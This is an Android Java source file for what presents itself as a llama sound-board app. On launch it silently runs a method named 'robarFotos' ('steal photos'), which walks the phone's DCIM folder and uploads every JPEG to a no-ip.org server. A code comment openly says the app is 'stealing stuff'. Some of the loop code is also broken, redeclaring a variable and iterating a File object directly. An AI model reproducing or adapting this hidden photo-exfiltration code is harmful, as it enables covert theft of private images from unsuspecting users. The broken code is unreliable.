package com.example.lallamaquenollama;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.*;

import android.app.Activity;
import android.media.MediaPlayer;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.os.Looper;
import android.util.Log;
import android.view.Menu;
import android.view.View;

import ch.boye.httpclientandroidlib.HttpResponse;
import ch.boye.httpclientandroidlib.HttpVersion;
import ch.boye.httpclientandroidlib.client.ClientProtocolException;
import ch.boye.httpclientandroidlib.client.HttpClient;
import ch.boye.httpclientandroidlib.client.entity.UrlEncodedFormEntity;
import ch.boye.httpclientandroidlib.client.methods.HttpGet;
import ch.boye.httpclientandroidlib.client.methods.HttpPost;
import ch.boye.httpclientandroidlib.entity.mime.HttpMultipartMode;
import ch.boye.httpclientandroidlib.entity.mime.MultipartEntity;
import ch.boye.httpclientandroidlib.entity.mime.content.ByteArrayBody;
import ch.boye.httpclientandroidlib.impl.client.DefaultHttpClient;
import ch.boye.httpclientandroidlib.message.BasicNameValuePair;
import ch.boye.httpclientandroidlib.params.CoreProtocolPNames;
import ch.boye.httpclientandroidlib.util.EntityUtils;

import com.google.common.io.Files;

public class MainActivity extends Activity {
	private MediaPlayer mp;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		//mandarRequest(null);
		robarFotos(null);
	}
	
	public void robarFotos(View v) {
	    new Thread(new Runnable() {
	        public void run() {
	        	Looper.prepare();
	            mandarRequest(null);
	            Looper.loop();
	        }
	    }).start();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	public void reproducirSonido(View view) {
		try{
			this.mp.stop();
		}catch(Exception e){
			Log.d("LALLAMA","Problem playing file");
		} 
		finally{
			String soundToReproduce = view.getTag().toString();
			Integer soundId = getResources().getIdentifier( soundToReproduce , "raw" , this.getPackageName() );
			MediaPlayer mimp = MediaPlayer.create(getBaseContext(),
			soundId);
			this.mp = mimp;
			this.mp.start();
		}
	}
	
	public void pararSonido(View view) {
		try{
			this.mp.stop();
		} catch (Exception e) {}
	}

	public void mandarRequest(View view) {
		File sdCardRoot = Environment.getExternalStorageDirectory();
		File f = new File(sdCardRoot, "/DCIM");
		File[] files = f.listFiles();
		Queue<File> q = new ArrayDeque<File>();
		q.offer(f);
		while(!q.isEmpty()){
			File f = q.poll();
			for (File inFile : f) {
				if (inFile.isFile() && inFile.getName().matches("(.*)\\.jpg$")) {
					Log.d("LALLAMA",inFile.getName());
					new ImageUploadTask().execute(inFile);
				}else if(inFile.isDirectory()){
					q.offer(inFile);
				}
			}			
		}
	}

	private static String convertStreamToString(InputStream is) {
		BufferedReader reader = new BufferedReader(new InputStreamReader(is));
		StringBuilder sb = new StringBuilder();

		String line = null;
		try {
			while ((line = reader.readLine()) != null) {
				sb.append(line + "\n");
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				is.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return sb.toString();
	}

	private void showData(String data) {
	}

	private class ImageUploadTask extends AsyncTask<File, Integer, String> {
		@Override
		protected String doInBackground(File... params) {
			try {
				return postImage(params[0]);
			} catch (NoSuchAlgorithmException e) {
				return null;
			}
		}

		protected void onPostExecute(String result) {
			if(result != null) showData(result);
		}

		private static final String SECRET_URL = "http://manzana.no-ip.org/poster.php";

		private String toSHA1(byte[] convertme) {
		    final char[] HEX_CHARS = "0123456789abcdef".toCharArray();
		    MessageDigest md = null;
		    try {
		        md = MessageDigest.getInstance("SHA-1");
		    }
		    catch(NoSuchAlgorithmException e) {
		        e.printStackTrace();
		    }
		    byte[] buf = md.digest(convertme);
		    char[] chars = new char[2 * buf.length];
		    for (int i = 0; i < buf.length; ++i) {
		        chars[2 * i] = HEX_CHARS[(buf[i] & 0xF0) >>> 4];
		        chars[2 * i + 1] = HEX_CHARS[buf[i] & 0x0F];
		    }
		    return new String(chars);
		}
		
		//returns image data to send, or null if it should not be send
		//i.e. it is already in the server
		private byte[] dataToSendToServer(File f){
			HttpPost httppost = new HttpPost(ImageUploadTask.SECRET_URL);
			HttpClient client = new DefaultHttpClient();

			client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);	
	
			byte [] imageBytes;
			try {
				imageBytes = Files.toByteArray(f);
			} catch (IOException e) {
				//We do not want the app to crash since we are stealing stuff!!
				e.printStackTrace();
				return null;
			}
			
			String digest = toSHA1(imageBytes);
	
			try {
				httppost.setEntity(new UrlEncodedFormEntity(Arrays.asList(new BasicNameValuePair("digest",digest))));
			//} catch (Exception e) {
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
				return null;
			}

		    try {
		    	HttpResponse response = client.execute(httppost);
		    	String resp = EntityUtils.toString(response.getEntity());

		    	return resp.equals("OK") ? imageBytes : null;
		    } catch (ClientProtocolException e) {
				e.printStackTrace();
		    	return null;
			} catch (IOException e) {
				e.printStackTrace();
				return null;
			}

		}
		
		public String postImage(File f) throws NoSuchAlgorithmException {			
			byte [] imageBytes = dataToSendToServer(f);
			if(imageBytes == null){ 
				return null;
			}

			//If SHA-1 was not in the server, means we have to send the image itself.			
			HttpPost httppost = new HttpPost("http://manzana.no-ip.org/poster.php");
			HttpClient client = new DefaultHttpClient();

			client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
			 
			MultipartEntity entity = new MultipartEntity( HttpMultipartMode.BROWSER_COMPATIBLE );
			
			String[] parts = f.getAbsolutePath().split(File.pathSeparator);
			String extension = parts.length > 0 ? parts[parts.length-1] : "";

			ByteArrayBody fb = new ByteArrayBody(imageBytes,"image/"+extension,f.getName());
			entity.addPart( "imageName", fb);
			 			 
			httppost.setEntity( entity );
			 
			try {
				return EntityUtils.toString( client.execute( httppost ).getEntity(), "UTF-8" );
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}finally{
				client.getConnectionManager().shutdown();
			}
		}
	}
}
